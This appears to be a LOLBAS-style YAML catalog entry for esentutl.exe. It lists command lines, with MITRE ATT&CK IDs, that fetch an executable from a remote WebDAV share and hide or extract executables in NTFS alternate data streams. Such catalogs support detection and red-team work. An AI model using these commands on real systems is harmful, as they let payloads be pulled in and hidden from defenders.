---
name: Esentutl.exe
description: Binary for working with Microsoft Joint Engine Technology (JET) database
functions:
  download:
    - description: Copies the source EXE to the destination EXE file
      code: esentutl.exe /y \\live.sysinternals.com\tools\adrestore.exe /d \\otherwebdavserver\webdav\adrestore.exe /o
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Use to copy files from one unc path to another
  copy:
    - description: Copies the source VBS file to the destination VBS file.
      code: esentutl.exe /y C:\folder\sourcefile.vbs /d C:\folder\destfile.vbs /o
      mitreid: T1105
      mitrelink: https://attack.mitre.org/wiki/Technique/T1105
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copies files from A to B
  ads:
    - description: Copies the source EXE to an Alternate Data Stream (ADS) of the destination file.
      code: esentutl.exe /y C:\ADS\file.exe /d c:\ADS\file.txt:file.exe /o
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy file and hide it in an alternate data stream as a defensive counter measure
    - description: Copies the source Alternate Data Stream (ADS) to the destination EXE.
      code: esentutl.exe /y C:\ADS\file.txt:file.exe /d c:\ADS\file.exe /o
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Extract hidden file within alternate data streams
    - description: Copies the remote source EXE to the destination Alternate Data Stream (ADS) of the destination file.
      code: esentutl.exe /y \\192.168.100.100\webdav\file.exe /d c:\ADS\file.txt:file.exe /o
      mitreid: T1096
      mitrelink: https://attack.mitre.org/wiki/Technique/T1096
      operatingsystem: Windows vista, Windows 7, Windows 8, Windows 8.1, Windows 10
      privileges: User
      usecase: Copy file and hide it in an alternate data stream as a defensive counter measure
resources:
    - resource: https://twitter.com/egre55/status/985994639202283520
fullpath:
    - path: C:\Windows\System32\esentutl.exe
    - path: C:\Windows\SysWOW64\esentutl.exe
detection:
  - IOC: 
acknowledgement:
  - Person: egre55
    Handle: '@egre55'
---
